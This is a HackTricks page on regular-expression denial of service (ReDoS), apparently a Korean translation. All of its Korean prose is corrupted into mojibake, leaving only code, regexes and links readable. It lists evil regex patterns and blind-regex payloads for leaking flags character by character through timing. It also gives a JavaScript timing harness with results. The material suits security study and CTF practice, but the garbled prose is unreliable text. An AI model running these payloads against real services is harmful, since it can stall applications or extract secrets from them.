# ì •ê·œ í‘œí˜„ì‹ ê±°ë¶€ ì„œë¹„ìŠ¤ - ReDoS

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

# ì •ê·œ í‘œí˜„ì‹ ê±°ë¶€ ì„œë¹„ìŠ¤ (ReDoS)

**ì •ê·œ í‘œí˜„ì‹ ê±°ë¶€ ì„œë¹„ìŠ¤ (ReDoS)**ëŠ” ì •ê·œ í‘œí˜„ì‹(í…ìŠ¤íŠ¸ì—ì„œ íŒ¨í„´ì„ ê²€ìƒ‰í•˜ê³  ì¼ì¹˜ì‹œí‚¤ëŠ” ë°©ë²•)ì˜ ì‘ë™ ë°©ì‹ì— ì·¨ì•½ì ì„ ì´ìš©í•˜ëŠ” ê²½ìš° ë°œìƒí•©ë‹ˆë‹¤. ë•Œë•Œë¡œ ì •ê·œ í‘œí˜„ì‹ì„ ì‚¬ìš©í•  ë•Œ, íŠ¹íˆ ì‘ì—… ì¤‘ì¸ í…ìŠ¤íŠ¸ ì¡°ê°ì´ ì»¤ì§ˆ ê²½ìš° ë§¤ìš° ëŠë ¤ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ëŠë¦¼ì€ í…ìŠ¤íŠ¸ í¬ê¸°ì˜ ì‘ì€ ì¦ê°€ì—ë„ ë§¤ìš° ë¹ ë¥´ê²Œ ì¦ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìëŠ” ì´ ë¬¸ì œë¥¼ ì´ìš©í•˜ì—¬ ì •ê·œ í‘œí˜„ì‹ì„ ì‚¬ìš©í•˜ëŠ” í”„ë¡œê·¸ë¨ì„ ì˜¤ë«ë™ì•ˆ ì œëŒ€ë¡œ ì‘ë™í•˜ì§€ ëª»í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.


## ë¬¸ì œê°€ ë˜ëŠ” ì •ê·œ í‘œí˜„ì‹ì˜ ë‹¨ìˆœ ì•Œê³ ë¦¬ì¦˜

**ìì„¸í•œ ë‚´ìš©ì€ [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)ì—ì„œ í™•ì¸í•˜ì„¸ìš”**


## ì•…ì„± ì •ê·œ í‘œí˜„ì‹ <a href="#evil-regexes" id="evil-regexes"></a>

ì•…ì„± ì •ê·œ í‘œí˜„ì‹ íŒ¨í„´ì€ **DoSë¥¼ ìœ ë°œí•˜ëŠ” ì¡°ì‘ëœ ì…ë ¥ì— ê°‡í ìˆ˜ ìˆëŠ” íŒ¨í„´**ì…ë‹ˆë‹¤. ì•…ì„± ì •ê·œ í‘œí˜„ì‹ íŒ¨í„´ì€ ì¼ë°˜ì ìœ¼ë¡œ ë°˜ë³µ ê·¸ë£¹ê³¼ ë°˜ë³µ ë˜ëŠ” ì¤‘ì²©ëœ ëŒ€ì²´ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ì¼ë¶€ ì•…ì„± íŒ¨í„´ì˜ ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} (x > 10)

ëª¨ë“  ì´ëŸ¬í•œ íŒ¨í„´ì€ ì…ë ¥ `aaaaaaaaaaaaaaaaaaaaaaaa!`ì— ì·¨ì•½í•©ë‹ˆë‹¤.

## ReDoS í˜ì´ë¡œë“œ

### ReDoSë¥¼ í†µí•œ ë¬¸ìì—´ ìœ ì¶œ

CTF(ë˜ëŠ” ë²„ê·¸ ë°”ìš´í‹°)ì—ì„œëŠ” **ì •ê·œ í‘œí˜„ì‹ì´ ë¯¼ê°í•œ ì •ë³´(ê¹ƒë°œ)ì™€ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë° ì‚¬ìš©**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ê²½ìš°, **ì •ê·œ í‘œí˜„ì‹ì´ ì¼ì¹˜í•˜ëŠ” ê²½ìš° í˜ì´ì§€ë¥¼ ë©ˆì¶”ê²Œ(íƒ€ì„ì•„ì›ƒ ë˜ëŠ” ë” ê¸´ ì²˜ë¦¬ ì‹œê°„)** ë§Œë“¤ë©´ ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ë¬¸ìì—´ì„ **ë¬¸ìë³„ë¡œ ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [**ì´ ê²Œì‹œë¬¼**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)ì—ì„œ ë‹¤ìŒ ReDoS ê·œì¹™ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `^(?=<flag>)((.*)*)*salt$`
* ì˜ˆì‹œ: `^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* [**ì´ writeup**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)ì—ì„œ ë‹¤ìŒì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:`<flag>(((((((.*)*)*)*)*)*)*)!`
* [**ì´ writeup**](https://ctftime.org/writeup/25869)ì—ì„œëŠ” ë‹¤ìŒì„ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤: `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### ì…ë ¥ ë° ì •ê·œ í‘œí˜„ì‹ ì œì–´ë¥¼ í†µí•œ ReDoS

ë‹¤ìŒì€ **ì…ë ¥**ê³¼ **ì •ê·œ í‘œí˜„ì‹ì„ ëª¨ë‘ ì œì–´**í•˜ëŠ” **ReDoS** ì˜ˆì‹œì…ë‹ˆë‹¤:
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## ë„êµ¬

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

## ì°¸ê³  ìë£Œ
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
* [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
* [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)
* [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ ê¸°ë²•ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
